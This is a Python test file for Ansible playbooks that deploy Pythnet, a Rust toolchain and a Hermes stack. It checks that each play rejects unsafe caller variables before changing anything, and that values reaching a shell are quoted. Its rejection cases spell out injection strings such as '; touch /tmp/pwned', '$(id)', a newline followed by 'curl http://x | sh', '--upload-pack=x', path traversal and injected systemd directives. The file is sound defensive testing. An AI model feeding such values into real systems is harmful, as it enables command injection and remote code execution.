"""Tests of the plays that take a value from the caller (-e or the inventory) and put it into a shell, a URL, a path or a unit.

cmn/boost_performance.yml (amd_pstate_mode), mainnet-pythnet/install_rust.yml (pythnet_rust_toolchain),
mainnet-pythnet/build_pythnet.yml (pythnet_repo, pythnet_ref, pythnet_ledger_mount) and cmn/install_hermes_stack.yml
(hermes_repo, hermes_repo_ref, beacon_repo, beacon_repo_ref, nats_version, hermes_rust_toolchain, nats_port,
beacon_listen_port, beacon_spy_grpc_addr and the addresses and names that go into the units) read their values from the caller.
Each play checks the values in a task of its own, before it changes anything, and stops with a message that says
"Nothing was changed on <host>"; the values that go into a shell are quoted there as well.

The tests run the real ansible-playbook on this machine over a local connection, without become, sudo, a network or a
host, with a temporary directory as HOME. Each play's own vars: and its checks (the tasks that come before the first
task that changes something) run in a probe play that writes down which hosts got past them. Like test_init_geyser_plugin.py,
whose helpers they take, they need PyYAML and ansible-playbook. Run from the repository root:

    python3 -m unittest discover -s template/latest/tests/rpc_geyser -p 'test_*.py' -v
"""

import functools
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path

import yaml

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_init_geyser_plugin import ANSIBLE_DIR, run_ansible, write_inventory  # noqa: E402

BOOST = ANSIBLE_DIR / "cmn" / "boost_performance.yml"
RUSTUP = ANSIBLE_DIR / "mainnet-pythnet" / "install_rust.yml"
PYTHNET = ANSIBLE_DIR / "mainnet-pythnet" / "build_pythnet.yml"
HERMES = ANSIBLE_DIR / "cmn" / "install_hermes_stack.yml"

CHECK_MODULES = {"ansible.builtin.assert", "assert", "ansible.builtin.fail", "fail"}

TOOLCHAIN_GOOD = {"default": {}, "version": "1.78.0", "short": "1.60", "stable": "stable", "beta": "beta", "nightly": "nightly",
                  "dated": "nightly-2024-05-01"}
TOOLCHAIN_BAD = {"semicolon": "1.78.0; touch /tmp/pwned", "option": "--profile", "subshell": "$(id)",
                 "two-words": "1.78.0 --profile default", "newline": "stable\n", "empty": "", "latest": "latest",
                 "minus": "-1.0", "second-line": "1.78.0\ncurl http://x | sh"}


def play_of(path):
    source = yaml.safe_load(path.read_text())
    assert isinstance(source, list), path
    return source[0]


def checks_before_the_first_change(play):
    """The tasks of the play up to the first one that is not an assert or a fail."""
    tasks = []
    for task in play["tasks"]:
        if not CHECK_MODULES & set(task):
            break
        tasks.append(task)
    return tasks


@functools.lru_cache(maxsize=None)
def run_checks(path_name, hosts_key):
    """path_name: the play; hosts_key: the name of one of the HOSTS tables. Returns (hosts that got past the checks, output)."""
    path = {"boost": BOOST, "rustup": RUSTUP, "pythnet": PYTHNET, "hermes": HERMES}[path_name]
    hosts = HOSTS[hosts_key]
    with tempfile.TemporaryDirectory(prefix="slv-play-variables-") as tmp:
        root = Path(tmp)
        home = root / "home"
        home.mkdir()
        logs = root / "logs"
        logs.mkdir()
        play = play_of(path)
        marker = {"name": "mark the host past the checks",
                  "ansible.builtin.copy": {"content": "past", "dest": "{{ slv_log_dir }}/{{ inventory_hostname }}.past"}}
        probe = {"name": "the checks of %s" % path.name, "hosts": "all", "gather_facts": False,
                 "vars": dict(play.get("vars", {}), ansible_remote_tmp=str(root / "remote-tmp")),
                 "tasks": checks_before_the_first_change(play) + [marker]}
        playbook = root / "probe.yml"
        playbook.write_text(yaml.safe_dump([probe], sort_keys=False))
        write_inventory(root / "inventory.json", hosts)
        process = run_ansible(["-i", "inventory.json", playbook, "-e", "slv_log_dir=%s" % logs], root, home)
        return {name for name in hosts if (logs / (name + ".past")).exists()}, process.stdout


HOSTS = {}
HOSTS["boost"] = dict(
    {"ok-default": {}},
    **{"ok-" + mode: {"amd_pstate_mode": mode} for mode in ("active", "passive", "guided")},
    **{"bad-" + key: {"amd_pstate_mode": value} for key, value in {
        "semicolon": "active; touch /tmp/pwned", "upper": "Active", "empty": "", "two-words": "active passive",
        "newline": "active\nfoo", "subshell": "$(id)", "unknown": "performance"}.items()})
HOSTS["rustup"] = dict(
    {"ok-" + key: ({} if value == {} else {"pythnet_rust_toolchain": value}) for key, value in TOOLCHAIN_GOOD.items()},
    **{"bad-" + key: {"pythnet_rust_toolchain": value} for key, value in TOOLCHAIN_BAD.items()})
PYTHNET_GOOD = [{}, {"pythnet_repo": "git@github.com:pyth-network/pythnet.git"}, {"pythnet_ref": "release/1.2"}, {"pythnet_ref": "a1b2c3d"},
                {"pythnet_ledger_mount": "/data/ledger-1"}]
PYTHNET_BAD = [
    {"pythnet_repo": "https://x/y; touch /tmp/pwned"}, {"pythnet_repo": "file:///etc"}, {"pythnet_repo": "--upload-pack=x"},
    {"pythnet_repo": "https://x/y z"}, {"pythnet_ref": "-f"}, {"pythnet_ref": "a b"}, {"pythnet_ref": "x;y"}, {"pythnet_ref": "../x"},
    {"pythnet_ref": "a..b"}, {"pythnet_ledger_mount": "relative"}, {"pythnet_ledger_mount": "/mnt/../etc"},
    {"pythnet_ledger_mount": "/mnt/led ger"}, {"pythnet_ledger_mount": "/mnt/$(id)"}]
HOSTS["pythnet"] = dict({"ok-%d" % i: value for i, value in enumerate(PYTHNET_GOOD)},
                        **{"bad-%d" % i: value for i, value in enumerate(PYTHNET_BAD)})
HERMES_BAD = [
    {"hermes_repo": "https://x/y z"}, {"hermes_repo": "file:///etc"}, {"beacon_repo": "https://x/y; id"}, {"hermes_repo_ref": "-x"},
    {"hermes_repo_ref": "main; id"}, {"beacon_repo_ref": "a b"}, {"nats_version": "2.10.22"}, {"nats_version": "v2.10.22; id"},
    {"nats_version": "../../etc"}, {"hermes_rust_toolchain": "1.82.0; touch /tmp/pwned"}, {"nats_port": "4222 --x"},
    {"nats_port": 70000}, {"nats_port": 0}, {"nats_port": "abc"}, {"beacon_listen_port": "8999\nExecStartPre=/bin/x"},
    {"beacon_spy_grpc_addr": "127.0.0.1:7072 --x"}, {"beacon_spy_grpc_addr": "no-port"}, {"hermes_rpc_listen_addr": "0.0.0.0"},
    {"hermes_metrics_listen_addr": "127.0.0.1:7576\nEnvironment=X=1"}, {"hermes_wormhole_env": "main net"},
    {"hermes_pythnet_http_addr": "ftp://x"}, {"hermes_pythnet_ws_addr": "http://x"}]
HERMES_GOOD = [{}, {"nats_port": 4333, "beacon_listen_port": 9000, "beacon_spy_grpc_addr": "[::1]:7072"},
               {"hermes_rust_toolchain": "stable", "nats_version": "v2.11.0", "hermes_repo_ref": "release/1.0",
                "hermes_rpc_listen_addr": "127.0.0.1:7575", "hermes_wormhole_env": "testnet"}]
HOSTS["hermes"] = dict({"ok-%d" % i: value for i, value in enumerate(HERMES_GOOD)},
                       **{"bad-%d" % i: value for i, value in enumerate(HERMES_BAD)})


class PlaysCheckTheValuesOfTheCallerBeforeTheyChangeAnything(unittest.TestCase):
    def check(self, play):
        past, output = run_checks(play, play)
        hosts = HOSTS[play]
        for name in hosts:
            with self.subTest(host=name, value=hosts[name]):
                if name.startswith("ok-"):
                    self.assertIn(name, past, "a value that the play can take is refused:\n" + output[-3000:])
                else:
                    self.assertNotIn(name, past, "a value that the play cannot take got past the checks:\n" + output[-3000:])
                    self.assertRegex(output, r"fatal: \[%s\]: FAILED! => .*Nothing was changed on %s\." % (re.escape(name), re.escape(name)))

    def test_v01_boost_performance_takes_one_of_the_three_modes_of_the_driver(self):
        self.check("boost")

    def test_v02_the_pythnet_toolchain_is_a_rust_version_or_channel(self):
        self.check("rustup")

    def test_v03_the_pythnet_build_takes_a_git_url_a_ref_and_an_absolute_path(self):
        self.check("pythnet")

    def test_v04_the_hermes_stack_takes_what_its_commands_urls_and_units_can_take(self):
        self.check("hermes")


def quoted_uses(text, name):
    """The Jinja expressions of the text that use the variable, as (expression, quoted)."""
    return [(match.group(0), "quote" in match.group(1)) for match in re.finditer(r"\{\{\s*%s\b([^}]*)\}\}" % re.escape(name), text)]


def executed_texts(play):
    """What a shell runs in the tasks of the play: the shell and command tasks and the scripts that a copy task installs."""
    texts = []
    for task in play["tasks"]:
        for module in ("ansible.builtin.shell", "shell", "ansible.builtin.command", "command"):
            if module in task:
                args = task[module]
                texts.append(args if isinstance(args, str) else str(args.get("cmd", "")))
        for module in ("ansible.builtin.copy", "copy"):
            if module in task and str(task[module].get("dest", "")).endswith(".sh"):
                texts.append(str(task[module].get("content", "")))
    return texts


class ValuesThatEnterAShellAreQuoted(unittest.TestCase):
    def test_v05_the_mode_the_toolchains_and_the_rest_are_quoted_where_a_shell_takes_them(self):
        for path, names in ((BOOST, ["slv_amd_pstate_mode"]), (RUSTUP, ["slv_pythnet_rust_toolchain"]), (HERMES, ["rust_toolchain"])):
            play = play_of(path)
            for name in names:
                uses = [use for text in executed_texts(play) for use in quoted_uses(text, name)]
                with self.subTest(play=path.name, variable=name):
                    self.assertTrue(uses, "the variable is not used in a shell any more")
                    for expression, quoted in uses:
                        self.assertTrue(quoted, "%s: %s reaches a shell unquoted" % (path.name, expression))

    def test_v06_each_play_checks_its_values_in_a_task_of_its_own_before_anything_else(self):
        for path in (BOOST, RUSTUP, PYTHNET, HERMES):
            with self.subTest(play=path.name):
                tasks = checks_before_the_first_change(play_of(path))
                self.assertEqual(len(tasks), 1, "one check comes first, and then the first task that changes something")


if __name__ == "__main__":
    unittest.main()
